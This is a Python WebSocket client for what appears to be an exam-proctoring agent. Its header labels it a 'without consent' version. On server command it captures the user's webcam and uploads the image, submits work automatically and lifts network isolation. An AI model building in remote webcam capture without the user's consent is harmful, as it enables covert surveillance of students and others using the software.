# ws_client.py - Version sans consentement
import asyncio
import websockets
import json
import sys
from webcam import capturer_webcam
from submit import soumettre_travaux
from config import WS_URL

token_jwt = None

async def connecter(token: str):
    global token_jwt
    token_jwt = token
    
    try:
        async with websockets.connect(f"{WS_URL}?token={token}", ping_interval=20, ping_timeout=10) as ws:
            print(f" Connecté au serveur Sentinel")
            
            await ws.send(json.dumps({
                "type": "AGENT_HELLO",
                "version": "1.0.0",
                "os": sys.platform
            }))
            
            async for message in ws:
                try:
                    data = json.loads(message)
                    await traiter_commande(ws, data)
                except json.JSONDecodeError:
                    print(f" Message invalide")
                    
    except Exception as e:
        print(f" Erreur connexion : {e}")

async def traiter_commande(ws, data: dict):
    action = data.get("action")
    
    if action == "FIN_EXAMEN":
        print(" Fin d'examen - soumission AUTOMATIQUE")
        resultat = soumettre_travaux(token_jwt)
        await ws.send(json.dumps({
            "type": "SOUMISSION",
            "ok": resultat.get("ok", False),
            "hash": resultat.get("hash")
        }))
    
    elif action == "CAPTURER_WEBCAM":
        print(" Capture webcam IMPOSÉE")
        image = capturer_webcam()
        await ws.send(json.dumps({
            "type": "WEBCAM_CAPTURE",
            "image": image,
            "raison": data.get("raison", "COMMANDE_SERVEUR")
        }))
    
    elif action == "DEVERROUILLER":
        from network import desactiver_isolation
        desactiver_isolation()
        print(" Agent déverrouillé")
    
    elif action == "PING":
        await ws.send(json.dumps({"type": "PONG"}))